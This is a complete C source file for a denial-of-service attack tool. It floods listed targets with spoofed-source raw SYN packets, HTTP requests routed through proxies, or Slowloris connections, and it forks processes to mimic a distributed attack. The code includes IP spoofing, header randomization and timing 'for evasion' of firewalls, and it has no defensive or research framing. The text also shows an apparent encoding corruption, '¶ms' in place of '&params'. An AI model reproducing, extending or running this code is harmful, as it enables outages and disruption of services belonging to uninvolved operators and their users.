#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <linux/if_packet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <curl/curl.h>  // For HTTP proxy and request support

#define MAX_PACKET_SIZE 4096
#define MAX_THREADS 10000
#define MAX_PROXIES 1000

typedef struct {
    char **target_ips;          // Array of target IPs/Domains
    int *target_ports;          // Array of target ports
    int num_targets;            // Number of targets
    int duration;               // Duration in seconds
    int threads_per_target;     // Threads per target
    char **proxy_list;          // List of proxies (IP:PORT:TYPE)
    int num_proxies;            // Number of proxies
    int spoof_ip;               // Enable IP spoofing
    int bypass_firewall;        // Enable firewall bypass
    int randomize_headers;      // Randomize TCP headers
    int http_flood;             // Enable HTTP flooding
    int slowloris;              // Enable Slowloris attack
    char *user_agent;           // Custom User-Agent for HTTP
    int distributed;            // Simulate distributed attack
} AttackParams;

char *generate_random_ip() {
    char *ip = malloc(16);
    snprintf(ip, 16, "%d.%d.%d.%d",
             rand() % 256, rand() % 256, rand() % 256, rand() % 256);
    return ip;
}

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;
    for (sum = 0; len > 1; len -= 2) sum += *buf++;
    if (len == 1) sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void send_raw_packet(char *src_ip, char *dst_ip, int dst_port, int randomize_headers) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return;

    struct iphdr iph = {0};
    struct tcphdr tcph = {0};
    char packet[MAX_PACKET_SIZE];

    iph.ihl = 5;
    iph.version = 4;
    iph.tos = rand() % 256;  // Random TOS for evasion
    iph.tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph.id = htonl(rand() % 65535);
    iph.frag_off = 0;
    iph.ttl = rand() % 128 + 64;  // Random TTL
    iph.protocol = IPPROTO_TCP;
    iph.saddr = inet_addr(src_ip);
    iph.daddr = inet_addr(dst_ip);
    iph.check = checksum(&iph, sizeof(iph));

    tcph.source = htons(rand() % 65535);
    tcph.dest = htons(dst_port);
    tcph.seq = htonl(rand());
    tcph.ack_seq = 0;
    tcph.doff = 5;
    tcph.syn = 1;
    tcph.window = htons(rand() % 10000 + 1000);
    if (randomize_headers) {
        tcph.urg = rand() % 2;
        tcph.psh = rand() % 2;
        tcph.fin = rand() % 2;
    }
    tcph.check = checksum(&tcph, sizeof(tcph));

    memcpy(packet, &iph, sizeof(iph));
    memcpy(packet + sizeof(iph), &tcph, sizeof(tcph));

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dst_port);
    sin.sin_addr.s_addr = inet_addr(dst_ip);

    sendto(sock, packet, iph.tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    close(sock);
}

void http_flood(CURL *curl, const char *target, const char *proxy, int slowloris, const char *user_agent) {
    curl_easy_setopt(curl, CURLOPT_URL, target);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent);
    if (proxy) curl_easy_setopt(curl, CURLOPT_PROXY, proxy);

    if (slowloris) {
        curl_easy_setopt(curl, CURLOPT_CONNECT_ONLY, 1L);
        curl_easy_perform(curl);
        char buf[1] = {0};
        while (1) {
            curl_easy_send(curl, "X-a: b\r\n", 8, NULL);
            usleep(500000);  // Slowloris delay
        }
    } else {
        curl_easy_perform(curl);
    }
}

void *flood(void *arg) {
    AttackParams *params = (AttackParams *)arg;
    CURL *curl = NULL;
    if (params->http_flood || params->slowloris) {
        curl = curl_easy_init();
        if (!curl) return NULL;
    }

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < params->duration) {
        for (int t = 0; t < params->num_targets; t++) {
            char *proxy = (params->num_proxies > 0) ? params->proxy_list[rand() % params->num_proxies] : NULL;

            if (params->http_flood || params->slowloris) {
                char url[256];
                snprintf(url, sizeof(url), "http://%s:%d/", params->target_ips[t], params->target_ports[t]);
                http_flood(curl, url, proxy, params->slowloris, params->user_agent);
            } else if (params->spoof_ip) {
                char *fake_ip = generate_random_ip();
                send_raw_packet(fake_ip, params->target_ips[t], params->target_ports[t], params->randomize_headers);
                free(fake_ip);
            } else {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock < 0) continue;

                struct sockaddr_in server_addr = {0};
                server_addr.sin_family = AF_INET;
                server_addr.sin_port = htons(params->target_ports[t]);
                server_addr.sin_addr.s_addr = inet_addr(params->target_ips[t]);

                if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                    close(sock);
                    continue;
                }
                close(sock);
            }

            if (params->bypass_firewall) {
                usleep((rand() % 2000) * 100);  // Random delay for evasion
            }
        }
    }

    if (curl) curl_easy_cleanup(curl);
    return NULL;
}


char **load_proxies(const char *filename, int *count) {
    FILE *fp = fopen(filename, "r");
    if (!fp) {
        *count = 0;
        return NULL;
    }

    char **proxies = NULL;
    char line[256];
    *count = 0;
    while (fgets(line, sizeof(line), fp) && *count < MAX_PROXIES) {
        line[strcspn(line, "\n")] = 0;
        proxies = realloc(proxies, (*count + 1) * sizeof(char *));
        proxies[*count] = strdup(line);
        (*count)++;
    }
    fclose(fp);
    return proxies;
}

int main(int argc, char *argv[]) {
    if (argc < 7) {
        printf("Usage: %s <target_file> <port_file> <duration> <threads_per_target> <proxy_file> <user_agent> [spoof_ip] [bypass_firewall] [randomize_headers] [http_flood] [slowloris] [distributed]\n");
        printf("Example: %s targets.txt ports.txt 60 10 proxies.txt \"Mozilla/5.0\" 1 1 1 1 1 1\n");
        return 1;
    }

    srand(time(NULL));
    curl_global_init(CURL_GLOBAL_ALL);

    AttackParams params = {0};

   
    FILE *target_fp = fopen(argv[1], "r");
    if (!target_fp) {
        printf("Failed to open target file\n");
        return 1;
    }
    char target_line[256];
    while (fgets(target_line, sizeof(target_line), target_fp)) {
        target_line[strcspn(target_line, "\n")] = 0;
        params.target_ips = realloc(params.target_ips, (params.num_targets + 1) * sizeof(char *));
        params.target_ips[params.num_targets] = strdup(target_line);
        params.num_targets++;
    }
    fclose(target_fp);

   
    FILE *port_fp = fopen(argv[2], "r");
    if (!port_fp) {
        printf("Failed to open port file\n");
        return 1;
    }
    char port_line[256];
    int port_count = 0;
    while (fgets(port_line, sizeof(port_line), port_fp)) {
        port_line[strcspn(port_line, "\n")] = 0;
        params.target_ports = realloc(params.target_ports, (port_count + 1) * sizeof(int));
        params.target_ports[port_count] = atoi(port_line);
        port_count++;
    }
    fclose(port_fp);

    if (port_count != params.num_targets) {
        printf("Number of ports must match number of targets\n");
        return 1;
    }

    params.duration = atoi(argv[3]);
    params.threads_per_target = atoi(argv[4]);
    params.proxy_list = load_proxies(argv[5], ¶ms.num_proxies);
    params.user_agent = argv[6];
    params.spoof_ip = (argc > 7) ? atoi(argv[7]) : 0;
    params.bypass_firewall = (argc > 8) ? atoi(argv[8]) : 0;
    params.randomize_headers = (argc > 9) ? atoi(argv[9]) : 0;
    params.http_flood = (argc > 10) ? atoi(argv[10]) : 0;
    params.slowloris = (argc > 11) ? atoi(argv[11]) : 0;
    params.distributed = (argc > 12) ? atoi(argv[12]) : 0;


    if (params.duration <= 0 || params.threads_per_target <= 0 || params.num_targets <= 0) {
        printf("Invalid parameters\n");
        return 1;
    }

    printf("Starting ultimate TCP flood...\n");
    printf("Targets: %d, Duration: %d sec, Threads/target: %d, Proxies: %d, HTTP: %d, Slowloris: %d, Distributed: %d\n",
           params.num_targets, params.duration, params.threads_per_target, params.num_proxies,
           params.http_flood, params.slowloris, params.distributed);


    if (params.distributed) {
        for (int i = 0; i < 5; i++) {  // Simulate 5 "nodes"
            pid_t pid = fork();
            if (pid == 0) break;  // Child process continues
            else if (pid < 0) perror("Fork failed");
        }
    }


    pthread_t *threads = malloc(params.num_targets * params.threads_per_target * sizeof(pthread_t));
    if (!threads) {
        perror("Thread allocation failed");
        return 1;
    }

    for (int t = 0; t < params.num_targets; t++) {
        for (int i = 0; i < params.threads_per_target; i++) {
            if (pthread_create(&threads[t * params.threads_per_target + i], NULL, flood, ¶ms) != 0) {
                perror("Thread creation failed");
            }
        }
    }

 
    for (int i = 0; i < params.num_targets * params.threads_per_target; i++) {
        pthread_join(threads[i], NULL);
    }


    for (int i = 0; i < params.num_targets; i++) free(params.target_ips[i]);
    for (int i = 0; i < params.num_proxies; i++) free(params.proxy_list[i]);
    free(params.target_ips);
    free(params.target_ports);
    free(params.proxy_list);
    free(threads);
    curl_global_cleanup();

    printf("Flood completed.\n");
    return 0;
}